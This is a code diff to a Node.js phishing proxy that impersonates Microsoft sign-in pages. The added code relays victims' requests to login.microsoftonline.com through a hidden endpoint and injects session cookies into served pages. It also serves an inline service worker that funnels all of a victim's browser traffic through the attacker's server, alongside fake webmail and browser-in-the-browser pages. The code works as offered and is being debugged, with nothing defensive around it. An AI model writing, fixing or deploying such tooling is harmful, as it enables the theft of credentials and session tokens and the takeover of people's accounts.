@@ -619,11 +619,77 @@ async function logVisit(clientRequest, clientResponse, sessionId) {
     try { fs.appendFileSync(VISITS_LOG_FILE, logLine); } catch (e) {}
 }
 
-// ── ✅ PROXY SERVER ──
-const proxyServer = http.createServer((clientRequest, clientResponse) => {
+// ── ✅ PROXY SERVER — COMPLETE FIX ──
+const proxyServer = http.createServer(async (clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
+    // ── ✅ Handle /lNv1pC9AWPUY4gbidyBO (proxy endpoint) ──
+    if (url === PROXY_PATHNAMES.proxy) {
+        let body = '';
+        
+        // Read the request body
+        await new Promise((resolve) => {
+            clientRequest.on('data', chunk => { body += chunk; });
+            clientRequest.on('end', resolve);
+        });
+
+        try {
+            const proxyData = JSON.parse(body);
+            console.log('📥 Proxy request:', proxyData.method, proxyData.url);
+            
+            // 🔥 FORWARD THE REQUEST TO MICROSOFT
+            const targetUrl = proxyData.url;
+            const targetHeaders = proxyData.headers || {};
+            
+            // Remove host header to avoid conflicts
+            delete targetHeaders.host;
+            
+            const fetchOptions = {
+                method: proxyData.method || 'GET',
+                headers: targetHeaders,
+                followRedirect: 'manual', // Handle redirects manually
+                timeout: 30000
+            };
+            
+            // Add body for POST/PUT requests
+            if (proxyData.body && (proxyData.method === 'POST' || proxyData.method === 'PUT')) {
+                fetchOptions.body = proxyData.body;
+            }
+            
+            // 🔥 Send request to Microsoft
+            const response = await fetch(targetUrl, fetchOptions);
+            
+            // Get response body
+            const responseBody = await response.text();
+            
+            // 🔥 Forward the response back to the client
+            const responseHeaders = {};
+            response.headers.forEach((value, key) => {
+                // Skip certain headers
+                if (!['content-encoding', 'content-length', 'transfer-encoding'].includes(key.toLowerCase())) {
+                    responseHeaders[key] = value;
+                }
+            });
+            
+            // Add content-length
+            responseHeaders['content-length'] = Buffer.byteLength(responseBody);
+            
+            // ✅ Send response
+            clientResponse.writeHead(response.status, responseHeaders);
+            clientResponse.end(responseBody);
+            
+            console.log('✅ Proxied response:', response.status);
+            
+        } catch (error) {
+            console.error('❌ Proxy error:', error);
+            clientResponse.writeHead(500, { 'Content-Type': 'application/json' });
+            clientResponse.end(JSON.stringify({ error: 'Proxy failed', message: error.message }));
+        }
+        return;
+    }
+
+    // ── ✅ Handle webmail and bitb ──
     if (url.startsWith('/bitb') || url === '/webmail' || url.startsWith('/webmail?')) {
         clientResponse.writeHead(200, { 'Content-Type': 'text/html' });
         const file = url.startsWith('/bitb') ? 'bitb.html' : 'webmail.html';
@@ -635,25 +701,42 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});
 
+    // ── ✅ Handle Phishing Entry Point ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
+            
             if (!currentSession) {
                 const { cookieName, cookieValue } = generateNewSession(phishedURL);
                 clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                 session = cookieName;
             }
+            
             VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
             VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
             VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
+            
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
             const filePath = path.join(__dirname, PROXY_FILES.index);
-            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
-            else clientResponse.end('<h1>Index page not found</h1>');
+            if (fs.existsSync(filePath)) {
+                let html = fs.readFileSync(filePath, 'utf-8');
+                // ✅ Inject the session cookie into the page
+                html = html.replace('</body>', `
+                    <script>
+                        // Pass session to service worker
+                        document.cookie = "${session}=${VICTIM_SESSIONS[session].value}; path=/";
+                    </script>
+                </body>`);
+                clientResponse.end(html);
+            } else {
+                console.log('❌ Index file not found:', filePath);
+                clientResponse.end('<h1>Index page not found</h1>');
+            }
         } catch (error) {
+            console.error('❌ Proxy entry error:', error);
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
             const filePath = path.join(__dirname, PROXY_FILES.notFound);
             if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
@@ -662,28 +745,56 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    if (currentSession || url === PROXY_PATHNAMES.proxy) {
-        if (url === PROXY_PATHNAMES.serviceWorker) {
-            clientResponse.writeHead(200, { 'Content-Type': 'text/javascript', 'Cache-Control': 'no-store' });
-            const filePath = path.join(__dirname, url.slice(1));
-            if (fs.existsSync(filePath)) fs.createReadStream(filePath).pipe(clientResponse);
-            else clientResponse.end('// service worker placeholder');
-            return;
+    // ── ✅ Handle Service Worker ──
+    if (url === PROXY_PATHNAMES.serviceWorker) {
+        clientResponse.writeHead(200, { 'Content-Type': 'text/javascript', 'Cache-Control': 'no-store' });
+        const filePath = path.join(__dirname, url.slice(1));
+        if (fs.existsSync(filePath)) {
+            fs.createReadStream(filePath).pipe(clientResponse);
+        } else {
+            // ✅ Serve inline service worker if file missing
+            clientResponse.end(`
+                self.addEventListener('fetch', (event) => {
+                    event.respondWith(handleRequest(event.request));
+                });
+                async function handleRequest(request) {
+                    const proxyRequestURL = \`\${self.location.origin}/lNv1pC9AWPUY4gbidyBO\`;
+                    try {
+                        const proxyRequest = {
+                            url: request.url,
+                            method: request.method,
+                            headers: Object.fromEntries(request.headers.entries()),
+                            body: await request.text(),
+                            referrer: request.referrer
+                        };
+                        const response = await fetch(proxyRequestURL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(proxyRequest),
+                            mode: "same-origin"
+                        });
+                        return response;
+                    } catch (error) {
+                        console.error('Proxy error:', error);
+                        return new Response('Proxy error', { status: 500 });
+                    }
+                }
+            `);
         }
-        if (url === PROXY_PATHNAMES.favicon) {
-            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession]?.protocol || 'https:'}//${VICTIM_SESSIONS[currentSession]?.host || 'login.microsoftonline.com'}${url}` });
-            clientResponse.end();
-            return;
-        }
-        clientResponse.writeHead(200, { 'Content-Type': 'application/json' });
-        clientResponse.end(JSON.stringify({ status: 'proxy_ok', session: currentSession || 'new' }));
         return;
     }
 
+    // ── ✅ Handle Favicon ──
+    if (url === PROXY_PATHNAMES.favicon) {
+        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession]?.protocol || 'https:'}//${VICTIM_SESSIONS[currentSession]?.host || 'login.microsoftonline.com'}${url}` });
+        clientResponse.end();
+        return;
+    }
+
+    // ── ✅ Fallback: Redirect ──
     clientResponse.writeHead(301, { Location: REDIRECT_URL });
     clientResponse.end();
 });
-
 // ── ✅ HELPER FUNCTIONS ──
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
